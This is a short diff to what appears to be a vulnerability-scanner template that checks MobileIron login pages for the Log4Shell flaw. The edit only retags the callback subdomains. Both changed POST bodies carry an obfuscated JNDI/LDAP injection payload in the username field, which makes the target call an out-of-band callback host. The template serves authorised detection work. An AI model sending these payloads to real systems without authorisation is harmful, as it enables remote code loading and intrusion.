@@ -21,7 +21,7 @@ requests:
         Referer: {{RootURL}}/mifs/user/login.jsp
         Content-Type: application/x-www-form-urlencoded
 
-        j_username=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}/(}&j_password=password&logincontext=employee
+        j_username=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.irona.{{interactsh-url}}/(}&j_password=password&logincontext=employee
         
       - |
         POST /mifs/j_spring_security_check HTTP/1.1
@@ -30,7 +30,7 @@ requests:
         Referer: {{RootURL}}/mifs/user/login.jsp
         Content-Type: application/x-www-form-urlencoded
 
-        j_username=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/127.0.0.1#{{Host}}.{{interactsh-url}}/(}&j_password=password&logincontext=employee
+        j_username=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/127.0.0.1#{{Host}}.ironb.{{interactsh-url}}/(}&j_password=password&logincontext=employee
 
     matchers-condition: and
     matchers:
